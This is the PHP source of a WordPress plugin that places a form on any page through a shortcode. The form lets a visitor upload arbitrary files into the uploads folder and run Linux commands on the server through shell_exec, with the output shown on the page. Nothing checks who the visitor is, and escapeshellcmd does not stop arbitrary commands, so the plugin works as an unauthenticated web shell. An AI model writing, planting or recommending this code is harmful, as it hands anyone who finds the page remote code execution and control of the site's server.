<?php
/*
Plugin Name: Invin File Upload and Command Execution
Description: A plugin to upload files and execute commands from a WordPress page.
Version: 1.0
Author: Invincible
*/

// Add a shortcode [invin] to display the upload and command execution form
add_shortcode('invin', 'invin_form_shortcode');

function invin_form_shortcode() {
    ob_start();
    ?>
    <form method="post" enctype="multipart/form-data">
        <label for="file-upload">Upload a file:</label>
        <input type="file" name="file-upload" id="file-upload">
        <br>
        <label for="command">Enter a Linux command:</label>
        <input type="text" name="command" id="command">
        <br>
        <input type="submit" name="submit" value="Upload & Execute">
    </form>
    <?php
    
    if (isset($_POST['submit'])) {
        // Handle file upload
        if (!empty($_FILES['file-upload']['name'])) {
            $uploaded_file = $_FILES['file-upload'];
            $upload_dir = wp_upload_dir();
            $upload_path = $upload_dir['path'] . '/' . basename($uploaded_file['name']);

            if (move_uploaded_file($uploaded_file['tmp_name'], $upload_path)) {
                echo 'File uploaded successfully: ' . $upload_path;
            } else {
                echo 'File upload failed.';
            }
        }

        // Execute Linux command
        if (!empty($_POST['command'])) {
            $command = escapeshellcmd($_POST['command']);
            $output = shell_exec($command);
            echo '<pre>' . $output . '</pre>';
        }
    }

    return ob_get_clean();
}
?>
